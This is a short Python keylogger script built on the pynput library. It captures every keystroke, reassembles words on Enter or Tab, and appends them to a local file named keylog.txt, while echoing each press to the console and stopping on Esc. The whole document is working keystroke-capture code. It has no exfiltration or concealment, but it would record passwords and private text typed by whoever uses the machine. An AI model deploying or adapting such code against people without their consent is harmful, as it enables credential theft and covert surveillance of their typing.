from pynput.keyboard import Key, Listener

# hold a list of all keys pressed until an enter or tab
key_word = []


def on_press(key_stroke):
    # if the key pressed is the enter key, call write_keylog with the
    # key_word list
    if key_stroke == Key.enter:
        write_keylog(key_word)
    # if the key pressed is the tab key, append a special string and
    # call write_keylog with the key_word list
    elif key_stroke == Key.tab:
        key_word.append("[tab]")
        write_keylog(key_word)
    else:
        key_word.append(key_stroke)

    try:
        print('Key {0} pressed'.format(key_stroke.char))

    except AttributeError:
        print('Special key {0} pressed'.format(key_stroke))


def write_keylog(key):
    file = open('keylog.txt', 'a+')
    concate_key = ""
    for char in key:
        if char == Key.space:
            concate_key += " "
        elif char == Key.backspace:
            concate_key = concate_key[:-1]
        elif char == Key.shift or char == Key.caps_lock:
            pass
        else:
            concate_key += str(char).replace("'", "")
    file.write(concate_key)
    file.write("\n")
    file.close()
    key_word.clear()


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False


if __name__ == "__main__":
    with Listener(on_press=on_press,
                  on_release=on_release) as listener:
        listener.join()
